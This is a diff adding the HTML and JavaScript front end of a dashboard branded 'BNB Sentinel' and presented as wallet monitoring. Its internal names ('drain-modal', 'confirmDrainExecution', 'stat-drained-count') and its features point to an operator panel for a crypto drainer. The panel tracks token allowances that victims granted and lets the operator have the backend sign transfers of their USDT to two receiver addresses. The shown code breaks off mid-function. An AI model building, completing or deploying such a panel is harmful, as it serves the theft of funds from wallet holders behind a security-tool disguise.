@@ -1,0 +1,914 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BNB Sentinel - Admin Control Node</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        indigo: {
+                            50: '#fffbe6',
+                            100: '#fff3bf',
+                            200: '#ffe58f',
+                            300: '#ffd666',
+                            400: '#fcd535',
+                            500: '#f0b90b',
+                            600: '#d9a307',
+                            700: '#b8860b',
+                            800: '#8c6500',
+                            900: '#614700'
+                        },
+                        blue: {
+                            50: '#fffbe6',
+                            100: '#fff3bf',
+                            200: '#ffe58f',
+                            300: '#ffd666',
+                            400: '#fcd535',
+                            500: '#f0b90b',
+                            600: '#d9a307',
+                            700: '#b8860b',
+                            800: '#8c6500',
+                            900: '#614700'
+                        },
+                        nexus: {
+                            bg: '#0B0F19',
+                            card: '#111827',
+                            border: '#1f2937',
+                            hover: '#1f2937',
+                            accent: '#F0B90B'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #0B0E14;
+            color: #f3f4f6;
+        }
+        .bnb-grid-bg {
+            background-image:
+                radial-gradient(circle at 50% 8%, rgba(240, 185, 11, 0.12) 0%, transparent 58%),
+                linear-gradient(to right, rgba(35, 45, 63, 0.3) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(35, 45, 63, 0.3) 1px, transparent 1px);
+            background-size: 100% 100%, 32px 32px, 32px 32px;
+        }
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0b0f19;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1f2937;
+            border-radius: 9999px;
+        }
+        .wallet-address {
+            white-space: normal;
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body class="h-full flex flex-col font-sans antialiased selection:bg-indigo-500 selection:text-black bnb-grid-bg">
+    <div id="app" class="min-h-full flex flex-col w-full">
+        <div id="login-view" class="fixed inset-0 z-50 flex items-center justify-center bg-[#0b0f19]/95 backdrop-blur-md p-4 transition-all duration-300 bnb-grid-bg">
+            <div class="w-full max-w-md bg-[#121721]/95 rounded-3xl shadow-2xl border border-[#232D3F] p-6 sm:p-8 backdrop-blur-xl">
+                <div class="text-center mb-8">
+                    <div class="inline-flex items-center justify-center w-14 h-14 rounded-2xl bg-amber-500/15 border border-[#F0B90B]/35 text-[#F0B90B] shadow-lg shadow-amber-500/20 mb-3.5">
+                        <span class="text-2xl font-black" aria-hidden="true">⬡</span>
+                    </div>
+                    <h1 class="text-2xl font-extrabold tracking-tight text-white">BNB<span class="text-[#F0B90B]">Sentinel</span></h1>
+                    <p class="text-xs text-slate-400 mt-1">Multi-Node Telemetry &amp; BEP-20 Admin Gateway</p>
+                </div>
+
+                <form id="login-form" class="space-y-5">
+                    <div>
+                        <label for="login-email" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Admin Email / ID</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                <i class="fa-solid fa-user-shield"></i>
+                            </span>
+                            <input type="text" id="login-email" required placeholder="admin@company.com" class="w-full pl-10 pr-4 py-3 bg-[#0b0f19] border border-[#1f2937] rounded-xl text-sm text-white focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all">
+                        </div>
+                    </div>
+
+                    <div>
+                        <label for="login-password" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Master Password / Passkey</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                <i class="fa-solid fa-lock"></i>
+                            </span>
+                            <input type="password" id="login-password" required placeholder="Enter admin password" class="w-full pl-10 pr-4 py-3 bg-[#0b0f19] border border-[#1f2937] rounded-xl text-sm text-white focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all">
+                        </div>
+                    </div>
+
+                    <div class="flex items-center justify-between text-xs text-slate-400">
+                        <label class="flex items-center gap-2 cursor-pointer">
+                            <input type="checkbox" id="remember-device" class="rounded border-[#1f2937] bg-[#0b0f19] text-indigo-600 focus:ring-indigo-500">
+                            <span>Remember Device</span>
+                        </label>
+                        <span class="text-slate-500">Contact your administrator</span>
+                    </div>
+
+                    <button type="submit" class="w-full py-3.5 px-4 bg-gradient-to-r from-indigo-600 to-blue-600 hover:from-indigo-500 hover:to-blue-500 text-white font-semibold rounded-xl shadow-lg shadow-indigo-500/25 transition-all flex items-center justify-center gap-2 text-sm">
+                        <span>Connect Dashboard</span>
+                        <i class="fa-solid fa-arrow-right text-xs"></i>
+                    </button>
+                </form>
+
+                <div class="mt-6 pt-6 border-t border-[#1f2937] text-center">
+                    <p class="text-xs text-slate-400 flex items-center justify-center gap-1.5">
+                        <i class="fa-solid fa-circle text-emerald-500 text-[8px]"></i>
+                        Secure admin API session required
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <div id="dashboard-view" class="hidden flex-1 flex flex-col lg:flex-row min-h-screen">
+            <aside class="hidden lg:flex flex-col w-64 bg-[#111827] border-r border-[#1f2937] p-6 sticky top-0 h-screen z-25">
+                <div class="flex items-center gap-3 mb-8">
+                    <div class="w-8 h-8 rounded-lg bg-amber-500/20 border border-[#F0B90B]/35 flex items-center justify-center text-[#F0B90B] shadow-md shadow-amber-500/20">
+                        <span class="font-black" aria-hidden="true">⬡</span>
+                    </div>
+                    <h2 class="font-bold text-lg tracking-tight text-white">BNB Sentinel</h2>
+                </div>
+
+                <nav class="space-y-1.5 flex-1">
+                    <a href="#" onclick="switchTab('overview'); return false" id="nav-overview" data-tab="overview" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium bg-[#F0B90B]/15 text-[#F0B90B] border border-[#F0B90B]/30 transition-all">
+                        <i class="fa-solid fa-chart-pie w-5 text-indigo-400"></i>
+                        <span>Overview</span>
+                    </a>
+                    <a href="#" onclick="switchTab('transactions'); return false" id="nav-transactions" data-tab="transactions" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium text-slate-400 hover:bg-[#1f2937]/50 hover:text-white transition-all">
+                        <i class="fa-solid fa-list-check w-5 text-slate-500"></i>
+                        <span>Transactions</span>
+                    </a>
+                    <a href="#" onclick="switchTab('wallets'); return false" id="nav-wallets" data-tab="wallets" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium text-slate-400 hover:bg-[#1f2937]/50 hover:text-white transition-all">
+                        <i class="fa-solid fa-wallet w-5 text-slate-500"></i>
+                        <span>Wallets</span>
+                    </a>
+                    <a href="#" onclick="switchTab('approvals'); return false" id="nav-approvals" data-tab="approvals" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium text-slate-400 hover:bg-[#1f2937]/50 hover:text-white transition-all">
+                        <i class="fa-solid fa-key w-5 text-slate-500"></i>
+                        <span>Approvals</span>
+                    </a>
+                    <a href="#" onclick="switchTab('network-logs'); return false" id="nav-network-logs" data-tab="network-logs" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium text-slate-400 hover:bg-[#1f2937]/50 hover:text-white transition-all">
+                        <i class="fa-solid fa-network-wired w-5 text-slate-500"></i>
+                        <span>Network Logs</span>
+                    </a>
+                </nav>
+
+                <div class="pt-6 border-t border-[#1f2937] mt-auto">
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex items-center gap-3">
+                            <div aria-hidden="true" class="w-10 h-10 rounded-full border border-[#F0B90B]/35 bg-amber-500/20 flex items-center justify-center text-xs font-bold text-[#F0B90B]">AD</div>
+                            <div class="overflow-hidden">
+                                <h4 id="admin-user-label" class="text-xs font-semibold text-white truncate">Admin User</h4>
+                                <p id="admin-email-label" class="text-[10px] text-slate-400 truncate">admin session</p>
+                            </div>
+                        </div>
+                    </div>
+                    <button onclick="handleLogout()" class="w-full flex items-center justify-center gap-2 py-2 px-3 bg-red-950/30 hover:bg-red-900/40 text-red-400 rounded-xl text-xs font-semibold transition-all border border-red-900/50">
+                        <i class="fa-solid fa-power-off"></i>
+                        <span>Logout</span>
+                    </button>
+                </div>
+            </aside>
+
+            <div id="mobile-menu" class="fixed inset-0 z-50 bg-[#0b0f19]/85 backdrop-blur-sm hidden lg:hidden">
+                <div class="w-72 h-full bg-[#111827] p-6 flex flex-col justify-between shadow-2xl border-r border-[#1f2937]">
+                    <div>
+                        <div class="flex items-center justify-between mb-8">
+                            <div class="flex items-center gap-3">
+                                <div class="w-8 h-8 rounded-lg bg-amber-500/20 border border-[#F0B90B]/35 flex items-center justify-center text-[#F0B90B]">
+                                    <span class="font-black" aria-hidden="true">⬡</span>
+                                </div>
+                                <h2 class="font-bold text-base text-white">BNB Sentinel</h2>
+                            </div>
+                            <button onclick="toggleMobileMenu()" class="p-2 text-slate-400 hover:text-white">
+                                <i class="fa-solid fa-xmark text-lg"></i>
+                            </button>
+                        </div>
+                        <nav class="space-y-2">
+                            <a href="#" onclick="switchTab('overview'); toggleMobileMenu(); return false" data-tab="overview" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium bg-[#F0B90B]/15 text-[#F0B90B] border border-[#F0B90B]/30">
+                                <i class="fa-solid fa-chart-pie w-5 text-indigo-400"></i>Overview
+                            </a>
+                            <a href="#" onclick="switchTab('transactions'); toggleMobileMenu(); return false" data-tab="transactions" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium text-slate-400">
+                                <i class="fa-solid fa-list-check w-5"></i>Transactions
+                            </a>
+                            <a href="#" onclick="switchTab('wallets'); toggleMobileMenu(); return false" data-tab="wallets" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium text-slate-400">
+                                <i class="fa-solid fa-wallet w-5"></i>Wallets
+                            </a>
+                            <a href="#" onclick="switchTab('approvals'); toggleMobileMenu(); return false" data-tab="approvals" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium text-slate-400">
+                                <i class="fa-solid fa-key w-5"></i>Approvals
+                            </a>
+                            <a href="#" onclick="switchTab('network-logs'); toggleMobileMenu(); return false" data-tab="network-logs" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium text-slate-400">
+                                <i class="fa-solid fa-network-wired w-5"></i>Network Logs
+                            </a>
+                        </nav>
+                    </div>
+                    <button onclick="handleLogout()" class="w-full py-2.5 bg-red-950/40 text-red-400 rounded-xl text-xs font-semibold flex items-center justify-center gap-2 border border-red-900/50">
+                        <i class="fa-solid fa-power-off"></i>Logout
+                    </button>
+                </div>
+            </div>
+
+            <div class="flex-1 flex flex-col min-w-0">
+                <header class="bg-[#111827] border-b border-[#1f2937] sticky top-0 z-20 px-4 lg:px-8 py-3.5 flex items-center justify-between">
+                    <div class="flex items-center gap-4 w-full max-w-xl">
+                        <button onclick="toggleMobileMenu()" class="lg:hidden p-2 text-slate-400 hover:text-white rounded-xl">
+                            <i class="fa-solid fa-bars text-lg"></i>
+                        </button>
+                        <div class="relative w-full">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                <i class="fa-solid fa-search text-xs"></i>
+                            </span>
+                            <input type="text" id="global-search" placeholder="Search addresses, tx hashes, amounts..." class="w-full pl-10 pr-4 py-2 bg-[#0b0f19] border border-[#1f2937] rounded-xl text-xs text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all">
+                        </div>
+                    </div>
+
+                    <div class="flex items-center gap-4 ml-4">
+                        <button onclick="loadDashboard()" aria-label="Refresh dashboard" class="p-2.5 rounded-xl bg-[#0b0f19] border border-[#1f2937] text-slate-400 hover:text-white relative">
+                            <i class="fa-solid fa-rotate text-sm"></i>
+                        </button>
+                        <div class="hidden sm:flex items-center gap-2 bg-[#0b0f19] px-3 py-1.5 rounded-xl border border-[#1f2937]">
+                            <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                            <span id="backend-status-label" class="text-xs font-medium text-slate-300">Connecting</span>
+                        </div>
+                    </div>
+                </header>
+
+                <main class="flex-1 p-4 lg:p-8 space-y-6 max-w-7xl w-full mx-auto">
+                    <div>
+                        <h2 id="page-title" class="text-xl font-bold text-white">Overview</h2>
+                        <p id="page-subtitle" class="text-xs text-slate-400 mt-1">Live status from the secure monitoring backend.</p>
+                    </div>
+                    <section id="panel-overview" data-page-panel>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-6 gap-4">
+                        <div class="bg-[#111827] border border-[#1f2937] p-5 rounded-2xl shadow-sm relative flex flex-col justify-between">
+                            <div class="flex items-center justify-between mb-3">
+                                <span class="text-xs font-medium text-slate-400">Monitored Balance</span>
+                                <div class="w-8 h-8 rounded-xl bg-indigo-500/10 text-indigo-400 flex items-center justify-center">
+                                    <i class="fa-solid fa-chart-line text-sm"></i>
+                                </div>
+                            </div>
+                            <div>
+                                <div id="stat-volume" class="text-xl font-bold tracking-tight text-white mb-1">--</div>
+                                <div class="flex items-center gap-1.5 text-xs text-emerald-400 font-medium">
+                                    <i class="fa-solid fa-arrow-trend-up"></i>
+                                    <span id="stat-volume-trend">Monitoring live</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="bg-[#111827] border border-[#1f2937] p-5 rounded-2xl shadow-sm relative flex flex-col justify-between">
+                            <div class="flex items-center justify-between mb-3">
+                                <span class="text-xs font-medium text-slate-400">Incoming Transfer Volume</span>
+                                <div class="w-8 h-8 rounded-xl bg-rose-500/10 text-rose-400 flex items-center justify-center">
+                                    <i class="fa-solid fa-vault text-sm"></i>
+                                </div>
+                            </div>
+                            <div>
+                                <div id="stat-lifetime-amount" class="text-xl font-bold tracking-tight text-rose-400 mb-1">--</div>
+                                <div class="flex items-center gap-1.5 text-xs text-slate-400 font-medium">
+                                    <i class="fa-solid fa-shield-halved text-indigo-400"></i>
+                                    <span id="stat-drained-count">No data</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="bg-[#111827] border border-[#1f2937] p-5 rounded-2xl shadow-sm relative flex flex-col justify-between">
+                            <div class="flex items-center justify-between mb-3">
+                                <span class="text-xs font-medium text-slate-400">Lifetime Transferred Volume</span>
+                                <div class="w-8 h-8 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center">
+                                    <i class="fa-solid fa-arrow-right-arrow-left text-sm"></i>
+                                </div>
+                            </div>
+                            <div>
+                                <div id="stat-transferred-volume" class="text-xl font-bold tracking-tight text-emerald-400 mb-1">--</div>
+                                <div class="flex items-center gap-1.5 text-xs text-slate-400 font-medium">
+                                    <i class="fa-solid fa-circle-check text-emerald-400"></i>
+                                    <span>Confirmed to both receivers</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="bg-[#111827] border border-[#1f2937] p-5 rounded-2xl shadow-sm relative flex flex-col justify-between">
+                            <div class="flex items-center justify-between mb-3">
+                                <span class="text-xs font-medium text-slate-400">Active Networks</span>
+                                <div class="w-8 h-8 rounded-xl bg-purple-500/10 text-purple-400 flex items-center justify-center">
+                                    <i class="fa-solid fa-network-wired text-sm"></i>
+                                </div>
+                            </div>
+                            <div>
+                                <div id="stat-active-networks" class="text-xl font-bold tracking-tight text-white mb-2">--</div>
+                                <div id="stat-network-pills" class="flex items-center gap-1 flex-wrap"></div>
+                            </div>
+                        </div>
+
+                        <div class="bg-[#111827] border border-[#1f2937] p-5 rounded-2xl shadow-sm relative flex flex-col justify-between">
+                            <div class="flex items-center justify-between mb-3">
+                                <span class="text-xs font-medium text-slate-400">Pending Approvals</span>
+                                <div class="w-8 h-8 rounded-xl bg-amber-500/10 text-amber-400 flex items-center justify-center">
+                                    <i class="fa-solid fa-clock-rotate-left text-sm"></i>
+                                </div>
+                            </div>
+                            <div>
+                                <div id="stat-pending-approvals" class="text-xl font-bold tracking-tight text-white mb-1">--</div>
+                                <div class="text-[11px] text-slate-400 truncate">
+                                    <span id="stat-pending-detail">Awaiting backend sync</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="bg-[#111827] border border-[#1f2937] p-5 rounded-2xl shadow-sm relative flex flex-col justify-between">
+                            <div class="flex items-center justify-between mb-3">
+                                <span class="text-xs font-medium text-slate-400">Active Allowance Wallets</span>
+                                <div class="w-8 h-8 rounded-xl bg-red-500/10 text-red-400 flex items-center justify-center">
+                                    <i class="fa-solid fa-triangle-exclamation text-sm"></i>
+                                </div>
+                            </div>
+                            <div>
+                                <div id="stat-high-risk" class="text-xl font-bold tracking-tight text-white mb-1">--</div>
+                                <div class="flex items-center gap-1.5 text-xs text-red-400 font-medium">
+                                    <i class="fa-solid fa-circle text-[6px]"></i>
+                                    <span id="stat-high-risk-detail">No data</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="bg-[#111827] rounded-2xl border border-[#1f2937] p-6 shadow-sm">
+                        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 mb-6">
+                            <div>
+                                <h3 class="font-bold text-lg text-white">Live Monitoring Logs</h3>
+                                <p class="text-xs text-slate-400">Recent monitored wallets and their live network activity.</p>
+                            </div>
+                            <div class="flex items-center gap-3">
+                                <button onclick="document.getElementById('global-search').focus()" class="flex items-center gap-2 bg-[#0b0f19] hover:bg-[#1f2937] border border-[#1f2937] text-slate-300 px-3.5 py-2 rounded-xl text-xs font-medium transition-all">
+                                    <i class="fa-solid fa-filter text-xs"></i>
+                                    <span>Search</span>
+                                </button>
+                                <button onclick="exportLogsCSV()" class="flex items-center gap-2 bg-[#0b0f19] hover:bg-[#1f2937] border border-[#1f2937] text-slate-300 px-3.5 py-2 rounded-xl text-xs font-medium transition-all">
+                                    <i class="fa-solid fa-arrow-up-right-from-square text-xs"></i>
+                                    <span>Export CSV</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="overflow-x-auto">
+                            <table class="w-full min-w-[1200px] text-left text-sm whitespace-nowrap">
+                                <thead>
+                                    <tr class="border-b border-[#1f2937] text-[11px] font-semibold text-slate-400 uppercase tracking-wider">
+                                        <th class="pb-3.5 pl-2">Wallet</th>
+                                        <th class="pb-3.5 text-right pr-8">Current Balance</th>
+                                        <th class="pb-3.5 pl-8">Date & Time</th>
+                                        <th class="pb-3.5">Network/Chain ID</th>
+                                        <th class="pb-3.5">Token Contract</th>
+                                        <th class="pb-3.5">Approval</th>
+                                        <th class="pb-3.5">Wallet Last Block</th>
+                                        <th class="pb-3.5">Recent Activity</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="live-logs-tbody" class="divide-y divide-[#1f2937]/60">
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                    </section>
+
+                    <section id="panel-transactions" data-page-panel class="hidden bg-[#111827] rounded-2xl border border-[#1f2937] p-5 sm:p-6 shadow-sm">
+                        <div class="mb-5">
+                            <h3 class="font-bold text-lg text-white">Transaction History</h3>
+                            <p class="text-xs text-slate-400 mt-1">Incoming transfer events and admin-submitted executions from the backend.</p>
+                        </div>
+                        <div class="overflow-x-auto">
+                            <table class="w-full min-w-[760px] text-left text-sm whitespace-nowrap">
+                                <thead><tr class="border-b border-[#1f2937] text-[11px] font-semibold text-slate-400 uppercase tracking-wider"><th class="pb-3 pl-2">Type / Wallet</th><th class="pb-3">Amount</th><th class="pb-3">Date</th><th class="pb-3">Status</th><th class="pb-3">Transaction</th></tr></thead>
+                                <tbody id="transactions-tbody" class="divide-y divide-[#1f2937]/60"></tbody>
+                            </table>
+                        </div>
+                    </section>
+
+                    <section id="panel-wallets" data-page-panel class="hidden bg-[#111827] rounded-2xl border border-[#1f2937] p-5 sm:p-6 shadow-sm">
+                        <div class="mb-5">
+                            <h3 class="font-bold text-lg text-white">Monitored Wallets</h3>
+                            <p class="text-xs text-slate-400 mt-1">Review wallet balances and allowances, submit a manual transfer, or deactivate monitoring.</p>
+                        </div>
+                        <div class="overflow-x-auto">
+                            <table class="w-full min-w-[900px] text-left text-sm whitespace-nowrap">
+                                <thead><tr class="border-b border-[#1f2937] text-[11px] font-semibold text-slate-400 uppercase tracking-wider"><th class="pb-3 pl-2">Wallet</th><th class="pb-3">Network</th><th class="pb-3">Balance</th><th class="pb-3">Allowance</th><th class="pb-3">Status</th><th class="pb-3 text-right pr-2">Actions</th></tr></thead>
+                                <tbody id="wallets-tbody" class="divide-y divide-[#1f2937]/60"></tbody>
+                            </table>
+                        </div>
+                    </section>
+
+                    <section id="panel-approvals" data-page-panel class="hidden bg-[#111827] rounded-2xl border border-[#1f2937] p-5 sm:p-6 shadow-sm">
+                        <div class="mb-5">
+                            <h3 class="font-bold text-lg text-white">Approval Events</h3>
+                            <p class="text-xs text-slate-400 mt-1">Approval records emitted by the monitored token contract.</p>
+                        </div>
+                        <div class="overflow-x-auto">
+                            <table class="w-full min-w-[820px] text-left text-sm whitespace-nowrap">
+                                <thead><tr class="border-b border-[#1f2937] text-[11px] font-semibold text-slate-400 uppercase tracking-wider"><th class="pb-3 pl-2">Wallet</th><th class="pb-3">Spender</th><th class="pb-3">Amount</th><th class="pb-3">Network / Block</th><th class="pb-3">Processing</th><th class="pb-3">Date</th><th class="pb-3">Transaction</th></tr></thead>
+                                <tbody id="approvals-tbody" class="divide-y divide-[#1f2937]/60"></tbody>
+                            </table>
+                        </div>
+                    </section>
+
+                    <section id="panel-network-logs" data-page-panel class="hidden space-y-5">
+                        <div class="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-4">
+                            <div class="bg-[#111827] border border-[#1f2937] p-5 rounded-2xl"><p class="text-xs text-slate-400">Network</p><p id="network-name" class="text-sm font-semibold text-white mt-2">--</p></div>
+                            <div class="bg-[#111827] border border-[#1f2937] p-5 rounded-2xl"><p class="text-xs text-slate-400">Chain ID</p><p id="network-chain" class="text-sm font-semibold text-white mt-2">--</p></div>
+                            <div class="bg-[#111827] border border-[#1f2937] p-5 rounded-2xl"><p class="text-xs text-slate-400">Last Processed Block</p><p id="network-block" class="text-sm font-semibold text-white mt-2">--</p></div>
+                            <div class="bg-[#111827] border border-[#1f2937] p-5 rounded-2xl"><p class="text-xs text-slate-400">Monitor Updated</p><p id="network-updated" class="text-sm font-semibold text-white mt-2">--</p></div>
+                        </div>
+                        <div class="bg-[#111827] rounded-2xl border border-[#1f2937] p-5 sm:p-6 shadow-sm">
+                            <div class="mb-5"><h3 class="font-bold text-lg text-white">Network Event Log</h3><p class="text-xs text-slate-400 mt-1">Recent approval and transfer events observed by the monitor.</p></div>
+                            <div class="overflow-x-auto">
+                                <table class="w-full min-w-[760px] text-left text-sm whitespace-nowrap">
+                                    <thead><tr class="border-b border-[#1f2937] text-[11px] font-semibold text-slate-400 uppercase tracking-wider"><th class="pb-3 pl-2">Event</th><th class="pb-3">Wallet</th><th class="pb-3">Amount</th><th class="pb-3">Block</th><th class="pb-3">Notification</th><th class="pb-3">Date</th></tr></thead>
+                                    <tbody id="network-events-tbody" class="divide-y divide-[#1f2937]/60"></tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </section>
+                </main>
+            </div>
+        </div>
+
+        <div id="drain-modal" class="fixed inset-0 z-50 flex items-center justify-center bg-[#0b0f19]/85 backdrop-blur-md p-4 hidden">
+            <div class="w-full max-w-md bg-[#121721] rounded-3xl shadow-2xl border border-[#232D3F] p-6 sm:p-8 animate-in fade-in zoom-in-95 duration-200">
+                <div class="flex items-center justify-between mb-6">
+                    <div class="flex items-center gap-3">
+                        <div class="w-10 h-10 rounded-xl bg-indigo-500/10 text-indigo-400 flex items-center justify-center">
+                            <i class="fa-solid fa-paper-plane text-lg"></i>
+                        </div>
+                        <div>
+                            <h3 class="text-base font-bold text-white">Submit Manual Transfer</h3>
+                            <p class="text-xs text-slate-400">The backend signs and broadcasts this transaction.</p>
+                        </div>
+                    </div>
+                    <button onclick="closeDrainModal()" class="p-2 text-slate-400 hover:text-white">
+                        <i class="fa-solid fa-xmark text-lg"></i>
+                    </button>
+                </div>
+
+                <div class="space-y-4 mb-6">
+                    <div>
+                        <label class="block text-xs font-semibold uppercase text-slate-400 mb-1">Wallet Address</label>
+                        <input type="text" id="modal-wallet" readonly class="w-full px-3.5 py-2.5 bg-[#0b0f19] border border-[#1f2937] rounded-xl text-xs font-mono text-slate-300">
+                    </div>
+                    <div class="grid grid-cols-2 gap-3">
+                        <div>
+                            <label for="modal-amount" class="block text-xs font-semibold uppercase text-slate-400 mb-1">Transfer Amount (USDT)</label>
+                            <input type="number" id="modal-amount" min="0" step="any" required class="w-full px-3.5 py-2.5 bg-[#0b0f19] border border-[#1f2937] rounded-xl text-xs font-bold text-emerald-400">
+                        </div>
+                        <div>
+                            <label for="modal-receiver" class="block text-xs font-semibold uppercase text-slate-400 mb-1">Destination</label>
+                            <select id="modal-receiver" class="w-full px-3.5 py-2.5 bg-[#0b0f19] border border-[#1f2937] rounded-xl text-xs text-white">
+                                <option value="1">Receiver 1</option>
+                                <option value="2">Receiver 2</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold uppercase text-slate-400 mb-1">Network & Chain ID</label>
+                            <input type="text" id="modal-network" readonly class="w-full px-3.5 py-2.5 bg-[#0b0f19] border border-[#1f2937] rounded-xl text-xs text-slate-300">
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-semibold uppercase text-slate-400 mb-1">Token Contract</label>
+                        <input type="text" id="modal-contract" readonly class="w-full px-3.5 py-2.5 bg-[#0b0f19] border border-[#1f2937] rounded-xl text-xs font-mono text-slate-300">
+                    </div>
+                </div>
+
+                <div class="flex items-center justify-end gap-3">
+                    <button onclick="closeDrainModal()" class="px-4 py-2.5 bg-[#0b0f19] hover:bg-[#1f2937] text-slate-300 rounded-xl text-xs font-semibold transition-all">Cancel</button>
+                    <button onclick="confirmDrainExecution()" class="px-5 py-2.5 bg-gradient-to-r from-indigo-600 to-blue-600 hover:from-indigo-500 hover:to-blue-500 text-white rounded-xl text-xs font-semibold shadow-lg shadow-indigo-500/25 transition-all">Confirm Transfer</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="toast-container" class="fixed bottom-6 right-6 z-50 flex flex-col gap-3 pointer-events-none"></div>
+    </div>
+
+    <script type="text/plain" id="legacy-dashboard-script">
+        const API_BASE = window.__ADMIN_PANEL_API_URL__ || 'http://localhost:4000';
+        const SESSION_KEY = 'nexus-admin-session-token';
+        const USER_KEY = 'nexus-admin-username';
+        const DEFAULT_LIFETIME_AMOUNT = 0;
+
+        let logsData = [];
+        let activeDrainWallet = null;
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const loginForm = document.getElementById('login-form');
+            if (loginForm) {
+                loginForm.addEventListener('submit', handleLogin);
+            }
+            updateLoginStatus();
+        });
+
+        function getAuthHeaders() {
+            const token = localStorage.getItem(SESSION_KEY) || '';
+            return {
+                'Content-Type': 'application/json',
+                Authorization: token ? `Bearer ${token}` : ''
+            };
+        }
+
+        function formatAddress(value) {
+            if (!value) return 'n/a';
+            const str = String(value);
+            if (str.length <= 12) return str;
+            return `${str.slice(0, 6)}...${str.slice(-4)}`;
+        }
+
+        function formatCurrency(value, digits = 2) {
+            const numeric = Number(value);
+            if (!Number.isFinite(numeric)) return '$0.00';
+            return new Intl.NumberFormat('en-US', {
+                style: 'currency',
+                currency: 'USD',
+                minimumFractionDigits: digits,
+                maximumFractionDigits: digits
+            }).format(numeric);
+        }
+
+        function formatShortDate(dateString) {
+            if (!dateString) return 'n/a';
+            try {
+                const date = new Date(dateString);
+                if (Number.isNaN(date.getTime())) return 'n/a';
+                return date.toLocaleString('en-US', { month: 'short', day: 'numeric', year: 'numeric', hour: '2-digit', minute: '2-digit' });
+            } catch {
+                return 'n/a';
+            }
+        }
+
+        function safeNumber(value) {
+            const numeric = Number.parseFloat(String(value ?? '0'));
+            return Number.isFinite(numeric) ? numeric : 0;
+        }
+
+        function updateLoginStatus() {
+            const token = localStorage.getItem(SESSION_KEY);
+            const username = localStorage.getItem(USER_KEY) || 'Admin User';
+            const userLabel = document.getElementById('admin-user-label');
+            const emailLabel = document.getElementById('admin-email-label');
+            if (userLabel) userLabel.textContent = username;
+            if (emailLabel) emailLabel.textContent = token ? 'session active' : 'admin session';
+
+            if (token) {
+                document.getElementById('login-view').classList.add('opacity-0', 'pointer-events-none');
+                setTimeout(() => {
+                    document.getElementById('login-view').style.display = 'none';
+                    document.getElementById('dashboard-view').classList.remove('hidden');
+                    loadDashboard();
+                }, 200);
+            }
+        }
+
+        async function handleLogin(event) {
+            event.preventDefault();
+            const username = document.getElementById('login-email').value.trim();
+            const password = document.getElementById('login-password').value;
+
+            if (!username || !password) {
+                showNotification('Enter valid admin credentials.', 'error');
+                return;
+            }
+
+            try {
+                const response = await fetch(`${API_BASE}/api/admin/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                if (!response.ok) {
+                    const errorData = await response.json().catch(() => ({}));
+                    throw new Error(errorData.error || 'Authentication failed');
+                }
+
+                const data = await response.json();
+                localStorage.setItem(SESSION_KEY, data.token);
+                localStorage.setItem(USER_KEY, data.user?.username || username);
+                showNotification('Secure admin session authorized.', 'success');
+                document.getElementById('login-view').classList.add('opacity-0', 'pointer-events-none');
+                setTimeout(() => {
+                    document.getElementById('login-view').style.display = 'none';
